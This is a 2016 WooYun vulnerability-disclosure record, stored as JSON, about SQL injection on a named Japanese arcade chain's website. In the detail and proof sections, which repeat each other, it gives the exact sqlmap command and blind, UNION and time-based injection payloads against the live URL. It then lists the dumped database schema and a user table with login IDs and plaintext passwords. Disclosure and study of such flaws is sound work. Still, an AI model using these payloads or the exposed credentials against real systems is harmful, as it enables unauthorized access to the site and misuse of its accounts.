{"id": 88723, "wybug_id": "wooyun-2016-0214829", "wybug_title": "日本某大型游戏机连锁店存在sql注入                                      ", "wybug_corp": "atime.co.jp", "wybug_author": "路人甲", "wybug_date": "2016-05-31 17:14", "wybug_open_date": "2016-07-16 09:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(日本国家互联网应急中心(JPCERT/CC))处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-16：\t细节向公众公开  简要描述：   RT 详细说明：      官方网址：http://www.atime.co.jp，存在注入的网址：http://www.atime.co.jp/shop.php?sid=1 蚕食sid存在注入，放入sqlmap如下：C:\\Python27\\SQLMap>sqlmap.py -u \"http://www.atime.co.jp/shop.php?sid=1\" --dbs --time-sec 2    Place: GETParameter: sid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sid=1 AND 9458=9458    Type: UNION query    Title: MySQL UNION query (NULL) - 1 to 10 columns    Payload: sid=1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(CHAR(58,108,100,103,58),IFNULL(CAST(CHAR(108,114,110,112,85,120,87,79,116,69) AS CHAR),CHAR(32)),CHAR(58,113,121,111,58)), NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: sid=1 AND SLEEP(2)---[15:10:21] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 5.2.17back-end DBMS: MySQL 5.0.11[15:10:21] [INFO] fetching database namesavailable databases [1]:[*] LA04659038-atime1227数据库LA04659038-atime1227里面有11张表如下：Database: `LA04659038-atime1227`[11 tables]+-------------------+| atm_blog          || atm_blog_category || atm_blog_image    || atm_gallery       || atm_machine       || atm_news          || atm_ranking       || atm_recruit       || atm_setting       || atm_shop          || client_user       |+-------------------+查看client_user表Database: `LA04659038-atime1227`Table: client_user[5 columns]+------------------+--------------+| Column           | Type         |+------------------+--------------+| registration_day | datetime     || user_id          | bigint(20)   || user_login_id    | varchar(30)  || user_login_pwd   | varchar(30)  || user_name        | varchar(255) |+------------------+--------------+表数据：database '`LA04659038-atime1227`'Database: `LA04659038-atime1227`Table: client_user[2 entries]+---------+---------------+----------------+-----------+| user_id | user_login_id | user_login_pwd | user_name |+---------+---------------+----------------+-----------+| 2       | taka          | takaherc       | HERC      || 4       | atime         | atime777       | ATIME     |+---------+---------------+----------------+-----------+明文密码。   漏洞证明：  官方网址：http://www.atime.co.jp，存在注入的网址：http://www.atime.co.jp/shop.php?sid=1 蚕食sid存在注入，放入sqlmap如下：C:\\Python27\\SQLMap>sqlmap.py -u \"http://www.atime.co.jp/shop.php?sid=1\" --dbs --time-sec 2    Place: GETParameter: sid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sid=1 AND 9458=9458    Type: UNION query    Title: MySQL UNION query (NULL) - 1 to 10 columns    Payload: sid=1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(CHAR(58,108,100,103,58),IFNULL(CAST(CHAR(108,114,110,112,85,120,87,79,116,69) AS CHAR),CHAR(32)),CHAR(58,113,121,111,58)), NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: sid=1 AND SLEEP(2)---[15:10:21] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 5.2.17back-end DBMS: MySQL 5.0.11[15:10:21] [INFO] fetching database namesavailable databases [1]:[*] LA04659038-atime1227数据库LA04659038-atime1227里面有11张表如下：Database: `LA04659038-atime1227`[11 tables]+-------------------+| atm_blog          || atm_blog_category || atm_blog_image    || atm_gallery       || atm_machine       || atm_news          || atm_ranking       || atm_recruit       || atm_setting       || atm_shop          || client_user       |+-------------------+查看client_user表Database: `LA04659038-atime1227`Table: client_user[5 columns]+------------------+--------------+| Column           | Type         |+------------------+--------------+| registration_day | datetime     || user_id          | bigint(20)   || user_login_id    | varchar(30)  || user_login_pwd   | varchar(30)  || user_name        | varchar(255) |+------------------+--------------+表数据：database '`LA04659038-atime1227`'Database: `LA04659038-atime1227`Table: client_user[2 entries]+---------+---------------+----------------+-----------+| user_id | user_login_id | user_login_pwd | user_name |+---------+---------------+----------------+-----------+| 2       | taka          | takaherc       | HERC      || 4       | atime         | atime777       | ATIME     |+---------+---------------+----------------+-----------+明文密码。   修复方案：  修复   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2016-06-01 09:30 厂商回复：  最新状态： 2016-06-01：Hello  路人甲.This is JPCERT/CC.Thank you for your information.We will notify this information to the site administrator.  ", "replys": "漏洞评价：\n评价\n     2016-05-31 18:13 |    \t\theoo \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:18        | 努力从来不会亏待任何一个人。)\t\t \n  可以，很强势.jpg    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}